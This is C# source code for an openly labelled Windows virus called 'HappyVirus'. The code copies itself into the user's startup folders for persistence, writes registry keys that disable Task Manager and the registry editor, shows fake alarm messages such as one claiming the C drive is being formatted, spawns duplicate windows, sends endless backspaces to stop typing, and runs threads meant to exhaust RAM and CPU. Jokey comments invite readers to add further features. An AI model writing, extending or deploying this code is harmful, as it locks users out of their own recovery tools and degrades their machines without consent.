using System;
using System.Collections.Generic;
using Utility.ModifyRegistry;
using Microsoft.Win32;
using System.Windows.Forms;
using System.IO;
using System.Drawing;
using System.Diagnostics;
using System.Threading;

namespace HappyVirus_V_Edition
{
  public class HappyVirus
  {
    public enum WindowsFeature { regedit, TaskManager};

    // DATA MEMBERS:
    #region
    ModifyRegistry reg = new ModifyRegistry();
    string startupFolder1 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
    string startupFolder2 = @"C:\Users" + Environment.UserName + @"AppData\Roaming\Startup";
    string startupPath1 = "";
    string startupPath2 = "";
    string exePath = Application.ExecutablePath;
    System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
    string [] falseMessages = 
    {
      "Malicious Activity Detected in C:\\Windows\\System32\r\nPlease Delete Windows to fix this!",
      "Low disk space, formatting C drive...",
      "Bad day aye?\r\nDon't worry, just format :D", 
      "Do you want to fix this?", 
      "Banana PLZ!", 
      "This is definitely why you should go for Linux!", 
      "Are you now convinced that Windows sucks!", 
      "I hope yer not mad :(",
      "Wonderful day sir :)", 
      "I think you got a Virus or something!", 
      "is this like, mmm, oh yeah, I dunno :D",
      "be cool man, calm down :)",
      "Everything will be OK :)",
      "Don't worry, it's really nothing, it's just a virus :)",
      "Please wait, your CPU and RAM will fry in a couple of mins :)",
      "3n 3n 3n, vvvvvv, peeb peeb, out of the road :D",
      "Cortext Wins 8-|"
    };
    Form virusWindow;
    Random rand = new Random();
    #endregion

    // CONSTRUCTOR(S):
    #region
    // whenever you instansiate it, it'll infect the startup folders.
    public HappyVirus(Form virusWindow)
    {
      InfectStartup();
      this.virusWindow = virusWindow;
    }
    #endregion

    // METHODS:
    #region

    // this will disable some of windows features, like taskmgr, regedit, etc.
    // there's a lot of features to be added, you could add anything :D
    public void DisableWindowsFeature(WindowsFeature feature, bool disable)
    {
      if (feature == WindowsFeature.regedit || feature == WindowsFeature.TaskManager)
      { 
        reg.BaseRegistryKey = Registry.CurrentUser;
        reg.SubKey = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";

        if (feature == WindowsFeature.TaskManager)
        {
          reg.Write("DisableTaskMgr", (disable) ? 1 : 0);
        }
        else
        {
          reg.Write("DisableRegistryTools", (disable) ? 1 : 0);
        }
      }
    }

    // this makes sure that the virus is sitting in the startup folders.
    public void InfectStartup()
    {
      // checking to see if the exe is not in the startup folder, if so, then copy it.
      // there are more than one place to the startup folder.
      // 1-C:\Users\vexe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.
      // 2-C:\Users\vexe\StartMenu\Startup.

      string exeName = Path.GetFileName(exePath);

      // the first path:
      startupPath1 = startupFolder1 + "\\" + exeName;
      if (!FileOps.DoesPathExist(startupPath1))
        File.Copy(exePath, startupPath1);

      // the second one:
      startupPath2 = startupFolder2 + "\\" + exeName;
      if (!FileOps.DoesPathExist(startupFolder2))
        FileOps.CreateDirectory(startupFolder2);
      if(!FileOps.DoesPathExist(startupPath2))
        File.Copy(exePath, startupPath2);
    }
     
    // this generates a random message box with a random false-alarm message.
    // if the user clicks on abort, retry or ignore, the main window of the viurs will get duplicated.
    public void GenerateRandomMessageBoxes()
    {
      MessageBox.Show(GetRandomMessageText(), "You have been infected!", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Warning);
      DuplicateVirusWindow();
    }

    // this shows up a dupblicate window of the main virus window in a random position on the screen.
    private void DuplicateVirusWindow()
    {
      Form dupWindow = GetDupWindow();
      dupWindow.Show();
      dupWindow.Location = GetRandomLocation();
    }

    // this returns a dupblicate window of the main window (the one that is designed in the designer)
    private Form GetDupWindow()
    {
      Form dupWindow = new Form();
      PictureBox picture = new PictureBox();
      picture.Image = Properties.Resources.VVirus;
      picture.Location = new Point(13, 13);
      picture.Size = new Size(462, 466);
      dupWindow.Controls.Add(picture);
      dupWindow.Size = virusWindow.Size;
      dupWindow.ControlBox = false;
      dupWindow.BackColor = Color.Black;
      dupWindow.Opacity = 90/100.0; // 90%
      return dupWindow;
    }

    // this returns a random string message from the "falseMessages" array.
    private string GetRandomMessageText()
    {
      return (falseMessages[rand.Next(0, falseMessages.Length)]);
    }

    // this returns a random point that is inside the working area of yer primary screen.
    private Point GetRandomLocation()
    {
      Point randPoint = new Point();
      randPoint.X = rand.Next(0, Screen.PrimaryScreen.WorkingArea.Width);
      randPoint.Y = rand.Next(0, Screen.PrimaryScreen.WorkingArea.Height);
      return randPoint;
    }

    // this just keeps sending backspaces thus disturbing the user from typing anything.
    public void PreventTyping()
    {
      SendKeys.Send("{BACKSPACE}");
    }

    // These methods will kill the computer's resources, RAM and CPU.
    #region
    public void killResources()
    {
      // we'll start them in a new thread so that the main window won't freeze.
      Thread ramkiller = new Thread(() => killRAM()); 
      ramkiller.Start();
      Thread cpukiller = new Thread(() => killCPU());
      cpukiller.Start();
    }
    void killRAM()
    {
      // the killing of the ram is basically just loading stuff in to the memory.
      Bitmap bmp1, bmp2; // the more the merrier :D
      while (true)
      {
        bmp1 = bmp2 = Properties.Resources.bigSizePic; // this pic is about 2.4 migs, use a bigger one if you like :D
      }
    }
    void killCPU()
    {
      // the killing of the cpu is just launching new threads in an infinite loop.
      Thread t;
      while (true)
        t = new Thread(() => killRAM());
    }
    #endregion
    #endregion
  }
}
